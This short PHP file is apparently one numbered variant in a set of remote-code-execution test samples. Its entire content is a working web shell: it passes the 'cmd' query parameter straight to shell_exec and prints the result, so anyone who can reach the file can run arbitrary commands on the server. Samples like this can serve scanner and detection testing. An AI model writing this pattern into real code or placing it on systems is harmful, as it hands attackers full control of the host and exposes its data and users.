<?php
// RCE test variation #170
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>